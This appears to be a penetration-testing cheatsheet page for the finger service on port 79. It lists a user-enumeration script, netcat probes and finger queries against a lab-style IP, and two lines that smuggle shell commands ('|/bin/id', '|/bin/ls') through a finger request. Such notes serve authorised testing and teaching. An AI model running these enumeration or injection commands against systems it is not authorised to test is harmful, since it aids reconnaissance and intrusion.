---
title: "PORT 79 - Finger"
draft: false
images: []
description: "Finger Cheatsheet"
lead: "Finger Cheatsheet"
menu:
  docs:
    parent: "Ports"
weight: 79
toc: true
---

```
finger-user-enum.pl -U <wordlistUsername> -t <ip>
https://github.com/pentestmonkey/finger-user-enum

nc -vn 10.11.1.111 79
echo "root" | nc -vn 10.11.1.111 79

# User enumeration
finger @10.11.1.111       #List users
finger admin@10.11.1.111  #Get info of user
finger user@10.11.1.111   #Get info of user

finger "|/bin/id@example.com"
finger "|/bin/ls -a /@example.com"
```